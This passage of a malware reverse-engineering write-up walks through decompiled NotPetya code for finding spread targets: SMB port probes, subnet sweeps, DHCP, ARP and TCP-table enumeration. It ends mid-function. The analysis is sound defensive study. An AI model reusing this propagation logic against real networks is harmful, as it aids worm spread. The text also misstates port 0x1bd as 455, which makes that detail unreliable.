First we see a call to [GetComputerNameExW](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getcomputernameexw) to get the `ComputernamePhysicalNetBIOS` of the local computer. This information is then passed to [DhcpEnumSubnets](https://docs.microsoft.com/en-us/windows/win32/api/dhcpsapi/nf-dhcpsapi-dhcpenumsubnets) to get a list of all the subnets defined on the DHCP server. The remainder of the subroutine body is then a do loop over this list of subnets.

For each subnet [DhcpGetSubnetInfo](https://docs.microsoft.com/en-us/windows/win32/api/dhcpsapi/nf-dhcpsapi-dhcpgetsubnetinfo) is invoked to get more information about the subnet. It then filters out all the subnets that are actually enabled and invokes [https://docs.microsoft.com/en-us/windows/win32/api/dhcpsapi/nf-dhcpsapi-dhcpgetsubnetinfo](https://docs.microsoft.com/en-us/windows/win32/api/dhcpsapi/nf-dhcpsapi-dhcpenumsubnetclients) on each of them. This call returns a list of all the servered client in the subnet. Effectively this get all the client of the DHCP server.

After this we see a similar loop over all the clients of the DHCP server subnet. For each client their IP address is converted from host byte order to TCP/IP network byte order using [htonl](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-htonl) and then passed to `FUN_1000a3d9`.

### FUN_1000a3d9

```cpp
undefined4 FUN_1000a3d9(undefined4 param_1)

{
  int iVar1;
  
  iVar1 = FUN_1000a2e8(param_1,0x1bd);
  if ((iVar1 == 0) && (iVar1 = FUN_1000a2e8(param_1,0x8b), iVar1 == 0)) {
    return 0;
  }
  return 1;
}
```

Turns out this function doesn't do a whole lot by itself. It calls `FUN_1000a2e8` with the passed address and either `0x1bd` or `0x8b`. If both versions return `0` then the function returns `0`, otherwise `1` is returned.

### FUN_1000a2e8

```cpp
undefined4 FUN_1000a2e8(undefined4 param_1,undefined4 param_2){
  int iVar1;
  int iVar2;
  undefined4 local_12c;
  int local_128 [65];
  undefined2 local_24;
  undefined2 local_22;
  undefined4 local_20;
  undefined2 uStack28;
  undefined4 uStack26;
  undefined2 uStack22;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  
  local_24 = 0;
  local_22 = 0;
  local_20._0_2_ = 0;
  local_20._2_2_ = 0;
  uStack28 = 0;
  uStack26 = 0;
  uStack22 = 0;
  local_12c = 0;
  memset(local_128,0,0x100);
  local_10 = 0;
  local_c = 0;
  local_14 = 1;
  local_8 = 0;
  iVar1 = Ordinal_23(2,1,0);
  if (iVar1 != 0) {
    local_24 = 2;
    local_20 = param_1;
    local_22 = Ordinal_9(param_2);
    iVar2 = Ordinal_10(iVar1,0x8004667e,&local_14);
    if (iVar2 != -1) {
      Ordinal_4(iVar1,&local_24,0x10);
      local_12c = 1;
      local_10 = 2;
      local_c = 0;
      local_128[0] = iVar1;
      iVar2 = Ordinal_18(iVar1 + 1,0,&local_12c,0,&local_10);
      if (iVar2 != -1) {
        iVar2 = Ordinal_151(iVar1,&local_12c);
        if (iVar2 != 0) {
          local_8 = 1;
        }
      }
    }
    Ordinal_3(iVar1);
  }
  return local_8;
}
```

This function appears to contain a lot of unresolved references and structures so before we start analysing it we will start with properly filling in all the `Ordinal` calls and try to resolve some structures. The final result is much clearer.

```cpp
undefined4 FUN_1000a2e8(u_long address,u_short param_2){
  SOCKET s;
  int iVar1;
  fd_set local_12c;
  sockaddr local_24;
  u_long local_14;
  timeval local_10;
  undefined4 retval;
  
  local_24.sa_family = 0;
  local_24.sa_data._0_2_ = 0;
  local_24.sa_data._2_2_ = 0;
  local_24.sa_data._4_2_ = 0;
  local_24.sa_data._6_2_ = 0;
  local_24.sa_data._8_4_ = 0;
  local_24.sa_data._12_2_ = 0;
  local_12c.fd_count = 0;
  memset(local_12c.fd_array,0,0x100);
  local_10.tv_sec = 0;
  local_10.tv_usec = 0;
  local_14 = 1;
  retval = 0;
  s = socket(2,1,0);
  if (s != 0) {
    local_24.sa_family = 2;
    local_24.sa_data._2_4_ = address;
    local_24.sa_data._0_2_ = htons(param_2);
    iVar1 = ioctlsocket(s,-0x7ffb9982,&local_14);
    if (iVar1 != -1) {
      connect(s,&local_24,0x10);
      local_12c.fd_count = 1;
      local_10.tv_sec = 2;
      local_10.tv_usec = 0;
      local_12c.fd_array[0] = s;
      iVar1 = select(s + 1,(fd_set *)0x0,&local_12c,(fd_set *)0x0,&local_10);
      if (iVar1 != -1) {
        iVar1 = __WSAFDIsSet(s,&local_12c);
        if (iVar1 != 0) {
          retval = 1;
        }
      }
    }
    closesocket(s);
  }
  return retval;
}
```

The first thing we see happen is a call to [socket](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-socket) to open a socket of the `AF_INET` familiy which is the Internet Protocol version 4 (IPv4) family running `SOCK_STREAM` or TCP and no specific protocol.

From some investigation of the `sockaddr` structure we also figure out that `param_2` is actually the server port number to use. Recalling how this subroutine is invoked that means that two server ports are tested.

On the next line we see a call to [ioctlsocket](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-ioctlsocket). This call executes command `-0x7ffb9982` on socket `s` with parameter `local_14`. The command with this code is [FIONBIO](https://docs.microsoft.com/en-us/previous-versions/windows/embedded/ms891129(v%3Dmsdn.10)) which toggle nonblocking mode. The parameter passed determines wether to enable or disable this, since `local_14` is assigned a `1` nonblocking mode is enabled.

Assuming changing the blocking mode worked the [connect](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect) subroutine is invoked. This call opens a connection using the given socket and target server to connect to. As documented on MSDN this is followed up by a call to [select](https://docs.microsoft.com/nl-nl/windows/win32/api/winsock2/nf-winsock2-select) to determine if the socket was succesfully opened (specified to nonblocking sockets) by checking if the socket is writable.

Assuming the socket was opened succesfully and writable a call is made to [__WSAFDIsSet](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-__wsafdisset). This call checks if `s` is a member of the set of sockets to check for writability. The call seems odd though as `s` is clearly placed in this set earlier. In either case `1` is returned by the function if this worked. Finally the socket is always closed. This makes this subroutine more like a check if connection possible function, therefore we will rename it to `try_connect`.

### Back to FUN_1000a3d9

```cpp
undefined4 FUN_1000a3d9(u_long address){
  int iVar1;
  
  iVar1 = try_connect(address,0x1bd);
  if ((iVar1 == 0) && (iVar1 = try_connect(address,0x8b), iVar1 == 0)) {
    return 0;
  }
  return 1;
}
```

Back in `FUN_1000a3d9` we then clearly see that the function returns `1` only if a connection could be established to the passed address on port `0x1bd` or `0x8b`. Converting to decimal gives us the port numbers `455` and `139`. These ports are used by SMB, this is not surprising as NotPetya exploits the [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue) vulnerability, which is a vulnerability in Microsoft's implementation of the SMB protocol (Server Message Block). Presumably that also means that the code we are working with at the moment is part of the logic used to spread the malware. We will also rename `FUN_1000a3d9` to `check_if_smb_open`.

### Back to FUN_1000908a

So we have now discovered that for all the IP addressed iterated by this subroutine it is checked if the ports used by the SMB protocol are open. For all such address the following logic is executed.

```cpp
tcpip_address = htonl(client->ClientIpAddress);
open = check_if_smb_open(tcpip_address);
if (open != 0) {
  tcpip_address = htonl(client->ClientIpAddress);
  pCVar1 = (LPCSTR)Ordinal_12(tcpip_address);
  lpMem = lpcstr_to_lpwstr(pCVar1);
  if (lpMem != (LPWSTR)0x0) {
    possible_lock_and_wait_check_args(param_1);
    success = 0;
    hHeap = GetProcessHeap();
    HeapFree(hHeap,success,lpMem);
  }
}
```

This means that we will resolve the reference to `Ordinal_12` first. We find that this resolves to [inet_ntoa](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_ntoa) this subroutine converts an IPv4 address into an ASCII string following the standard dot notation.

We then again see a call to `possible_lock_and_wait_check_args` (note that things could have been passed via the registers again). The suspicious is that the just allocated address string is somehow passed as it is otherwise unused. It might be that these critical section, seemingly synchronisation functions pass possible targets that could be vulnerable to EternalBlue to some other thread. We will rename `FUN_1000908a` to `identify_vulnerable_hosts_for_eternalblue`.

The entire function ended up as the following after all the renaming.

```cpp
undefined4 identify_vulnerable_hosts_for_eternalblue(undefined4 crit_section){
  LPDHCP_CLIENT_INFO client;
  DWORD success;
  u_long tcpip_address;
  int open;
  in_addr in;
  char *pcVar1;
  LPWSTR ip_str;
  HANDLE hHeap;
  uint index;
  uint idx;
  WCHAR net_bios_name [260];
  DWORD total_clients;
  uint total_subnets_num;
  DWORD net_bios_name_len;
  uint num_clients;
  DHCP_RESUME_HANDLE resume_handle;
  DHCP_RESUME_HANDLE resume_handle_sub;
  DWORD total_subnets;
  DWORD clients_read;
  DWORD subnets_read;
  uint local_1c;
  uint local_18;
  LPDHCP_SUBNET_INFO subnet_info;
  LPDHCP_CLIENT_INFO_ARRAY client_info;
  LPDHCP_IP_ARRAY subnets [2];
  
  index = 0;
  idx = 0;
  resume_handle = 0;
  resume_handle_sub = 0;
  subnets[0] = (LPDHCP_IP_ARRAY)0x0;
  subnet_info = (LPDHCP_SUBNET_INFO)0x0;
  client_info = (LPDHCP_CLIENT_INFO_ARRAY)0x0;
  local_1c = 0;
  local_18 = 0;
  subnets_read = 0;
  total_subnets = 0;
  clients_read = 0;
  total_clients = 0;
  net_bios_name_len = 0x104;
  GetComputerNameExW(ComputerNamePhysicalNetBIOS,net_bios_name,&net_bios_name_len);
  success = DhcpEnumSubnets(net_bios_name,&resume_handle,0x400,subnets,&subnets_read,&total_subnets)
  ;
  if (success == 0) {
    total_subnets_num = subnets[0]->NumElements;
    if (total_subnets_num != 0) {
      do {
        success = DhcpGetSubnetInfo((WCHAR *)0x0,subnets[0]->Elements[index],&subnet_info);
        if ((success == 0) && (subnet_info->SubnetState == DhcpSubnetEnabled)) {
          success = DhcpEnumSubnetClients
                              ((WCHAR *)0x0,subnets[0]->Elements[index],&resume_handle_sub,0x10000,
                               &client_info,&clients_read,&total_clients);
          if (success == 0) {
            num_clients = client_info->NumElements;
            if ((num_clients != 0) && (idx < num_clients)) {
              do {
                client = client_info->Clients[idx];
                if (client != (LPDHCP_CLIENT_INFO)0x0) {
                  tcpip_address = htonl(client->ClientIpAddress);
                  open = check_if_smb_open(tcpip_address);
                  if (open != 0) {
                    in = (in_addr)htonl(client->ClientIpAddress);
                    pcVar1 = inet_ntoa(in);
                    ip_str = lpcstr_to_lpwstr(pcVar1);
                    if (ip_str != (LPWSTR)0x0) {
                      possible_lock_and_wait_check_args(crit_section);
                      success = 0;
                      hHeap = GetProcessHeap();
                      HeapFree(hHeap,success,ip_str);
                    }
                  }
                }
                idx = local_18 + 1;
                local_18 = idx;
              } while (idx < num_clients);
            }
            DhcpRpcFreeMemory(client_info);
          }
        }
        index = local_1c + 1;
        local_1c = index;
      } while (index < total_subnets_num);
    }
    DhcpRpcFreeMemory(subnets[0]);
  }
  return 0;
}
```


### Back to FUN_10008e7f

```cpp
undefined4 FUN_10008e7f(u_long crit_section){
  ULONG UVar1;
  ulong uVar2;
  LPWSTR lpMem;
  HANDLE hHeap;
  int iVar3;
  u_long *lpParameter;
  uint netlong;
  u_long uVar4;
  uint netlong_00;
  uint uVar5;
  _IP_ADAPTER_INFO *adapter_info;
  DWORD dwFlags;
  uint idx;
  uint local_3018;
  ULONG adapter_num;
  _IP_ADAPTER_INFO *p_Stack12300;
  HANDLE local_3008;
  undefined local_3004 [4092];
  uint adapter_ips_and_masks [2047];
  undefined4 uStack12;
  
  uStack12 = 0x10008e8f;
  uVar5 = 0;
  local_3008 = (HANDLE)0x0;
  memset(local_3004,0,0xffc);
  adapter_ips_and_masks[0] = 0;
  memset(adapter_ips_and_masks[1],0,0x1ffc);
  adapter_num = 0;
  idx = 0;
  local_3018 = 0;
  UVar1 = GetAdaptersInfo((_IP_ADAPTER_INFO *)0x0,&adapter_num);
  if ((UVar1 == 0x6f) &&
     (adapter_info = (_IP_ADAPTER_INFO *)LocalAlloc(0x40,adapter_num),
     adapter_info != (_IP_ADAPTER_INFO *)0x0)) {
    p_Stack12300 = adapter_info;
    UVar1 = GetAdaptersInfo(adapter_info,&adapter_num);
    if (UVar1 == 0) {
      do {
        if (0x3ff < idx) break;
        uVar2 = inet_addr((adapter_info->CurrentIpAddress).IpAddress.String + 4);
        adapter_ips_and_masks[idx * 2] = uVar2;
        uVar2 = inet_addr((adapter_info->CurrentIpAddress).IpMask.String + 4);
        adapter_ips_and_masks[1][idx * 2] = uVar2;
        lpMem = lpcstr_to_lpwstr((adapter_info->CurrentIpAddress).IpAddress.String + 4);
        if (lpMem != (LPWSTR)0x0) {
          possible_lock_and_wait_check_args(crit_section);
          dwFlags = 0;
          hHeap = GetProcessHeap();
          HeapFree(hHeap,dwFlags,lpMem);
        }
        if ((adapter_info->DhcpEnabled != 0) &&
           (lpMem = lpcstr_to_lpwstr((adapter_info->GatewayList).IpAddress.String + 4),
           lpMem != (LPWSTR)0x0)) {
          possible_lock_and_wait_check_args(crit_section);
          dwFlags = 0;
          hHeap = GetProcessHeap();
          HeapFree(hHeap,dwFlags,lpMem);
        }
        adapter_info = adapter_info->Next;
        idx = idx + 1;
      } while (adapter_info != (_IP_ADAPTER_INFO *)0x0);
      iVar3 = running_domain_controller_or_not_a_domain_controller();
      if (iVar3 != 0) {
        identify_vulnerable_hosts_for_eternalblue(crit_section);
      }
      if (idx != 0) {
        do {
          lpParameter = (u_long *)LocalAlloc(0x40,0xc);
          if (lpParameter != (u_long *)0x0) {
            uVar2 = inet_addr("255.255.255.255");
            netlong_00 = adapter_ips_and_masks[local_3018 * 2] &
                         adapter_ips_and_masks[1][local_3018 * 2];
            if ((netlong_00 != 0) &&
               (netlong = uVar2 ^ adapter_ips_and_masks[1][local_3018 * 2] | netlong_00,
               netlong != 0)) {
              uVar4 = htonl(netlong_00);
              *lpParameter = uVar4;
              uVar4 = htonl(netlong);
              lpParameter[1] = uVar4;
              lpParameter[2] = crit_section;
              hHeap = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10008e04,lpParameter,0,
                                   (LPDWORD)0x0);
              if (hHeap != (HANDLE)0x0) {
                (&local_3008)[local_3018] = hHeap;
              }
            }
          }
          local_3018 = local_3018 + 1;
        } while (local_3018 < idx);
      }
      if (local_3018 != 0) {
        do {
          CloseHandle((&local_3008)[uVar5]);
          uVar5 = uVar5 + 1;
        } while (uVar5 < local_3018);
      }
    }
    LocalFree(p_Stack12300);
  }
  return 0;
}
```

Next we see a check on `idx` being `0`. Presumably this checks that at least one adapter was present as this local was also used to keep track of the loop iterations in the do loop from before.

This also makes sense given the following loop which iterates over all the properties that were stored in `adapter_ips_and_masks`. Each of the stored IPs is masked with their subnet mask before being checked against `0`. If this check passes a new thread is started with 3 arguments.

- [0] The current IP address of the adapter.
- [1] The subnet mask of the adapter. 
- [2] The critical section object.

Note that this happens for each of the stored adapters.

Next we will look at the subroutine executed by the thread that is started `FUN_10008e04`.

### FUN_10008e04

```cpp
undefined4 FUN_10008e04(uint *param_1){
  uint uVar1;
  u_long address;
  int iVar2;
  in_addr in;
  char *pcVar3;
  LPWSTR lpMem;
  HANDLE hHeap;
  uint netlong;
  DWORD dwFlags;
  
  netlong = *param_1;
  uVar1 = param_1[1];
  while (netlong < uVar1) {
    address = htonl(netlong);
    iVar2 = check_if_smb_open(address);
    if (iVar2 != 0) {
      in = (in_addr)htonl(netlong);
      pcVar3 = inet_ntoa(in);
      lpMem = lpcstr_to_lpwstr(pcVar3);
      if (lpMem != (LPWSTR)0x0) {
        possible_lock_and_wait_check_args(param_1[2]);
        dwFlags = 0;
        hHeap = GetProcessHeap();
        HeapFree(hHeap,dwFlags,lpMem);
      }
    }
    netlong = netlong + 1;
  }
  LocalFree(param_1);
  return 0;
}
```

The function looks relatively simple, the loop iterates all IPs up from the passed first argument IP until it hits the subnet mask. For each of these address it is checked if SMB ports are open. If so then we see a call to `possible_lock_and_wait_check_args`. It seems appropriate to rename the function to `check_all_for_smb`.

### Back to FUN_10008e7f

Having parsed the entirety of this function is seems clear that it finds targets on the local network running SMB most likely so they can later be infected using EternalBlue. We will rename the function to `find_infection_candidates`.

### Back to FUN_10007c10

```cpp
void FUN_10007c10(void){
  bool bVar1;
  LPVOID lpParameter;
  BOOL BVar2;
  WCHAR net_bios_name [260];
  DWORD local_8;
  
  lpParameter = critical_section_no_extra_debug;
  possible_lock_and_wait_check_args(critical_section_no_extra_debug);
  possible_lock_and_wait_check_args(lpParameter);
  local_8 = 0x104;
  BVar2 = GetComputerNameExW(ComputerNamePhysicalNetBIOS,net_bios_name,&local_8);
  if (BVar2 != 0) {
    possible_lock_and_wait_check_args(lpParameter);
  }
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,find_infection_candidates,lpParameter,0,(LPDWORD)0x0);
  bVar1 = false;
  do {
    FUN_1000777b(lpParameter);
    FUN_1000786b(lpParameter);
    if (!bVar1) {
      FUN_1000795a(lpParameter,0x80000000,0);
      bVar1 = true;
    }
    Sleep(180000);
  } while( true );
}
```

Next we will look at the first of the 3 functions that are being executed every `180000ms` (`2 min`).

### FUN_1000777b

```cpp
uint FUN_1000777b(undefined4 crit_section){
  FARPROC pFVar1;
  HANDLE hHeap;
  int iVar2;
  uint uVar3;
  uint *lpMem;
  byte *pbVar4;
  DWORD dwFlags;
  SIZE_T dwBytes;
  WCHAR local_54 [32];
  HMODULE local_14;
  uint *local_10;
  undefined4 local_c;
  uint local_8;
  
  uVar3 = 0;
  local_14 = LoadLibraryW(L"iphlpapi.dll");
  if (local_14 != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(local_14,"GetExtendedTcpTable");
    if (pFVar1 == (FARPROC)0x0) {
      GetLastError();
    }
    else {
      dwBytes = 0x100000;
      dwFlags = 8;
      local_c = 0x100000;
      hHeap = GetProcessHeap();
      lpMem = (uint *)HeapAlloc(hHeap,dwFlags,dwBytes);
      local_10 = lpMem;
      if (lpMem != (uint *)0x0) {
        iVar2 = (*pFVar1)(lpMem,&local_c,0,2,1,0);
        uVar3 = (uint)(iVar2 == 0);
        if ((iVar2 == 0) && (local_8 = 0, *lpMem != 0)) {
          pbVar4 = (byte *)((int)lpMem + 0x12);
          do {
            if (*(int *)(pbVar4 + -0xe) == 5) {
              wsprintfW(local_54,L"%u.%u.%u.%u",(uint)pbVar4[-2],(uint)pbVar4[-1],(uint)*pbVar4,
                        (uint)pbVar4[1]);
              possible_lock_and_wait_check_args(crit_section);
              lpMem = local_10;
            }
            local_8 = local_8 + 1;
            pbVar4 = pbVar4 + 0x14;
          } while (local_8 < *lpMem);
        }
        dwFlags = 0;
        hHeap = GetProcessHeap();
        HeapFree(hHeap,dwFlags,lpMem);
      }
    }
    FreeLibrary(local_14);
  }
  return uVar3;
}
```

The first we see is `iphlpapi.dll` being loaded. If this worked then [GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress) is used to get the address of an exported function from the DLL the fuction obtained is `GetExtendedTcpTable`.

The next thing we see is the [GetExtendedTcpTable](https://docs.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-getextendedtcptable) function being invoked. The returned table is stored in the memory that was allocated before hand. The table class requested is `1` this should map to the [TCP_TABLE_BASIC_CONNECTIONS](https://docs.microsoft.com/nl-nl/windows/win32/api/iprtrmib/ne-iprtrmib-tcp_table_class) enum constant which means the function call returns a [MIB_TCPTABLE](https://docs.microsoft.com/nl-nl/windows/win32/api/tcpmib/ns-tcpmib-mib_tcptable) structure. Adding the associated typedef's and retyping the allocated memory makes the following part much clearer.

```cpp
uint FUN_1000777b(undefined4 crit_section){
  FARPROC function;
  HANDLE hHeap;
  int iVar1;
  uint uVar2;
  MIB_TCPTABLE *tcp_table;
  byte *pbVar3;
  DWORD dwFlags;
  SIZE_T dwBytes;
  WCHAR local_54 [32];
  HMODULE handle;
  MIB_TCPTABLE *table_point_copy;
  undefined4 table_size;
  uint local_8;
  
  uVar2 = 0;
  handle = LoadLibraryW(L"iphlpapi.dll");
  if (handle != (HMODULE)0x0) {
    function = GetProcAddress(handle,"GetExtendedTcpTable");
    if (function == (FARPROC)0x0) {
      GetLastError();
    }
    else {
      dwBytes = 0x100000;
      dwFlags = 8;
      table_size = 0x100000;
      hHeap = GetProcessHeap();
      tcp_table = (MIB_TCPTABLE *)HeapAlloc(hHeap,dwFlags,dwBytes);
      table_point_copy = tcp_table;
      if (tcp_table != (MIB_TCPTABLE *)0x0) {
        iVar1 = (*function)(tcp_table,&table_size,0,2,1,0);
        uVar2 = (uint)(iVar1 == 0);
        if ((iVar1 == 0) && (local_8 = 0, tcp_table->dwNumEntries != 0)) {
          pbVar3 = (byte *)((int)&tcp_table->table[0].dwRemoteAddr + 2);
          do {
            if (*(int *)(pbVar3 + -0xe) == 5) {
              wsprintfW(local_54,L"%u.%u.%u.%u",(uint)pbVar3[-2],(uint)pbVar3[-1],(uint)*pbVar3,
                        (uint)pbVar3[1]);
              possible_lock_and_wait_check_args(crit_section);
              tcp_table = table_point_copy;
            }
            local_8 = local_8 + 1;
            pbVar3 = pbVar3 + 0x14;
          } while (local_8 < tcp_table->dwNumEntries);
        }
        dwFlags = 0;
        hHeap = GetProcessHeap();
        HeapFree(hHeap,dwFlags,tcp_table);
      }
    }
    FreeLibrary(handle);
  }
  return uVar2;
}
```

We now see a loop over the row entries of the table. For each of the connections returned the remote address is returned although the addressing is totally messed up. We see a check on the remote address to check if `remote_ip + -0xe` is equal to `5`. This is a check on the last remote IP why is unclear though. If the check passed the remote address is formatted as an IP string using relative pointer offsets and then `possible_lock_and_wait_check_args` is invoked.

So to summarise this function checks all open connections to remote hosts and passes those remote IPs to the lock and wait subroutine. It seems appropriate to rename the function `find_remote_infection_candidates`.

### Back to FUN_10007c10

Next we will look at the second function in the loop `FUN_1000786b`.

### FUN_1000786b

```cpp
undefined4 FUN_1000786b(undefined4 crit_section){
  int iVar1;
  HANDLE hHeap;
  int iVar2;
  byte *pbVar3;
  uint *lpMem;
  byte *pbVar4;
  undefined4 *puVar5;
  bool bVar6;
  bool bVar7;
  DWORD dwFlags;
  SIZE_T dwBytes;
  WCHAR local_58 [32];
  undefined4 local_18;
  undefined4 local_14;
  uint *local_10;
  uint local_c;
  SIZE_T local_8;
  
  local_14 = 0;
  local_8 = 0;
  iVar1 = GetIpNetTable(0,&local_8,0);
  if (iVar1 == 0xe8) {
    local_14 = 0;
  }
  else {
    if (iVar1 == 0x7a) {
      dwFlags = 0;
      dwBytes = local_8;
      hHeap = GetProcessHeap();
      lpMem = (uint *)HeapAlloc(hHeap,dwFlags,dwBytes);
      if (lpMem != (uint *)0x0) {
        local_10 = lpMem;
        iVar1 = GetIpNetTable(lpMem,&local_8,0);
        if (iVar1 == 0) {
          local_14 = 1;
          local_c = 0;
          if (*lpMem != 0) {
            local_18 = 3;
            pbVar3 = (byte *)((int)lpMem + 0x16);
            do {
              iVar2 = 4;
              bVar6 = false;
              iVar1 = 0;
              bVar7 = true;
              pbVar4 = pbVar3 + 2;
              puVar5 = &local_18;
              do {
                if (iVar2 == 0) break;
                iVar2 = iVar2 + -1;
                bVar6 = *pbVar4 < *(byte *)puVar5;
                bVar7 = *pbVar4 == *(byte *)puVar5;
                pbVar4 = pbVar4 + 1;
                puVar5 = (undefined4 *)((int)puVar5 + 1);
              } while (bVar7);
              if (!bVar7) {
                iVar1 = (1 - (uint)bVar6) - (uint)(bVar6 != false);
              }
              if (iVar1 == 0) {
                wsprintfW(local_58,L"%u.%u.%u.%u",(uint)pbVar3[-2],(uint)pbVar3[-1],(uint)*pbVar3,
                          (uint)pbVar3[1]);
                possible_lock_and_wait_check_args(crit_section);
              }
              local_c = local_c + 1;
              pbVar3 = pbVar3 + 0x18;
              lpMem = local_10;
            } while (local_c < *local_10);
          }
        }
        dwFlags = 0;
        hHeap = GetProcessHeap();
        HeapFree(hHeap,dwFlags,lpMem);
      }
    }
  }
  return local_14;
}
```

First we see a call made to [GetIpNetTable](https://docs.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-getipnettable), normally this would store the returned mapping (ARP table) in the first argument which is supposed to be a pointer. This however seems to not happen in the decompilation result. On close inspection it appears that the signature got `GetIpNetTable` is missing. We first fix this signature.

```cpp
undefined4 FUN_1000786b(undefined4 crit_section){
  ULONG UVar1;
  HANDLE hHeap;
  int iVar2;
  int iVar3;
  byte *pbVar4;
  PMIB_IPNETTABLE IpNetTable;
  byte *pbVar5;
  undefined4 *puVar6;
  bool bVar7;
  bool bVar8;
  DWORD dwFlags;
  SIZE_T dwBytes;
  WCHAR local_58 [32];
  undefined4 local_18;
  undefined4 ret_val;
  PMIB_IPNETTABLE local_10;
  uint local_c;
  ULONG local_8;
  
  ret_val = 0;
  local_8 = 0;
  UVar1 = GetIpNetTable((PMIB_IPNETTABLE)0x0,&local_8,0);
  if (UVar1 == 0xe8) {
    ret_val = 0;
  }
  else {
    if (UVar1 == 0x7a) {
      dwFlags = 0;
      dwBytes = local_8;
      hHeap = GetProcessHeap();
      IpNetTable = (PMIB_IPNETTABLE)HeapAlloc(hHeap,dwFlags,dwBytes);
      if (IpNetTable != (PMIB_IPNETTABLE)0x0) {
        local_10 = IpNetTable;
        UVar1 = GetIpNetTable(IpNetTable,&local_8,0);
        if (UVar1 == 0) {
          ret_val = 1;
          local_c = 0;
          if (IpNetTable->dwNumEntries != 0) {
            local_18 = 3;
            pbVar4 = (byte *)((int)&IpNetTable->table[0].dwAddr + 2);
            do {
              iVar3 = 4;
              bVar7 = false;
              iVar2 = 0;
              bVar8 = true;
              pbVar5 = pbVar4 + 2;
              puVar6 = &local_18;
              do {
                if (iVar3 == 0) break;
                iVar3 = iVar3 + -1;
                bVar7 = *pbVar5 < *(byte *)puVar6;
                bVar8 = *pbVar5 == *(byte *)puVar6;
                pbVar5 = pbVar5 + 1;
                puVar6 = (undefined4 *)((int)puVar6 + 1);
              } while (bVar8);
              if (!bVar8) {
                iVar2 = (1 - (uint)bVar7) - (uint)(bVar7 != false);
              }
              if (iVar2 == 0) {
                wsprintfW(local_58,L"%u.%u.%u.%u",(uint)pbVar4[-2],(uint)pbVar4[-1],(uint)*pbVar4,
                          (uint)pbVar4[1]);
                possible_lock_and_wait_check_args(crit_section);
              }
              local_c = local_c + 1;
              pbVar4 = pbVar4 + 0x18;
              IpNetTable = local_10;
            } while (local_c < local_10->dwNumEntries);
          }
        }
        dwFlags = 0;
        hHeap = GetProcessHeap();
        HeapFree(hHeap,dwFlags,IpNetTable);
      }
    }
  }
  return ret_val;
}
```

Given that the pointer is still `NULL` and the result is checked against `0xe8` which maps to`ERROR_NO_DATA` we can assume that this call is just a check to see if the subroutine is usable.

Next we see a check for the same return code being `0x7a` this maps to `ERROR_INSUFFICIENT_BUFFER` which makes sense because the buffer passed was a `NULL` pointer. However this also means that the buffer size that would have been required is stored in `local_8`.

This is followed up by the allocation of a buffer of size `local_8` and then a second call to `GetIpNetTable`.

For all rows of the returned ip net table we then see the `dwAddr` attribute being retrieved which is the IPv4 address of the host. Similar to the previous function this address is convered to string form and then followed by call to `possible_lock_and_wait_check_args`. It seems appropriate to rename the function to `find_infection_candidates_arp`.

### Back to FUN_10007c10

Back in `FUN_10007c10` we now move on the remaining function in the loop `FUN_1000795a` the interesting thing about this function is that it is guarded by a boolean variable that makes it so it only executes once. Which makes the only reason for it being in the loop that it has to be executed after the first execution of the previously investigated subroutines.

### FUN_1000795a

```cpp
undefined4 FUN_1000795a(undefined4 param_1,undefined4 param_2,undefined4 param_3){
  int iVar1;
  uint uVar2;
  undefined4 *puVar3;
  undefined4 local_14;
  undefined4 local_10;
  uint local_c;
  LPVOID local_8;
  
  local_8 = (LPVOID)0x0;
  local_c = 0;
  local_14 = 0;
  local_10 = 0;
  iVar1 = NetServerEnum(0,0x65,&local_8,0xffffffff,&local_c,&local_14,param_2,param_3,&local_10);
  if ((iVar1 == 0) || (iVar1 == 0xea)) {
    param_3 = 1;
    if (local_8 == (LPVOID)0x0) {
      return 1;
    }
    uVar2 = 0;
    if (local_c != 0) {
      puVar3 = (undefined4 *)((int)local_8 + 4);
      do {
        if (puVar3 == (undefined4 *)&DAT_00000004) break;
        if ((puVar3[3] & 0x80000000) == 0) {
          if ((puVar3[-1] == 500) && (4 < ((byte)puVar3[1] & 0xf))) {
            possible_lock_and_wait_check_args(param_1);
          }
        }
        else {
          FUN_1000795a(param_1,3,*puVar3);
        }
        puVar3 = puVar3 + 6;
        uVar2 = uVar2 + 1;
      } while (uVar2 < local_c);
    }
  }
  else {
    param_3 = 0;
  }
  if (local_8 != (LPVOID)0x0) {
    NetApiBufferFree(local_8);
  }
  return param_3;
}
```

The subroutine starts with a call to [NetServerEnum](https://docs.microsoft.com/en-us/windows/win32/api/lmserver/nf-lmserver-netserverenum). Ghidra seems to be missing the function signature however, resolving this should fix most of the missing type details for this subroutine. This results in.

```cpp
undefined4 FUN_1000795a(undefined4 crit_section,DWORD param_2,LMCSTR param_3){
  DWORD DVar1;
  uint uVar2;
  undefined4 *puVar3;
  DWORD local_14;
  DWORD local_10;
  DWORD local_c;
  LPBYTE local_8;
  
  local_8 = (LPBYTE)0x0;
  local_c = 0;
  local_14 = 0;
  local_10 = 0;
  DVar1 = NetServerEnum((LMCSTR)0x0,0x65,&local_8,0xffffffff,&local_c,&local_14,param_2,param_3,
                        &local_10);
  if ((DVar1 == 0) || (DVar1 == 0xea)) {
    param_3 = (LMCSTR)0x1;
    if (local_8 == (LPBYTE)0x0) {
      return 1;
    }
    uVar2 = 0;
    if (local_c != 0) {
      puVar3 = (undefined4 *)(local_8 + 4);
      do {
        if (puVar3 == (undefined4 *)&DAT_00000004) break;
        if ((puVar3[3] & 0x80000000) == 0) {
          if ((puVar3[-1] == 500) && (4 < ((byte)puVar3[1] & 0xf))) {
            possible_lock_and_wait_check_args(crit_section);
          }
        }
        else {
          FUN_1000795a(crit_section,3,*puVar3);
        }
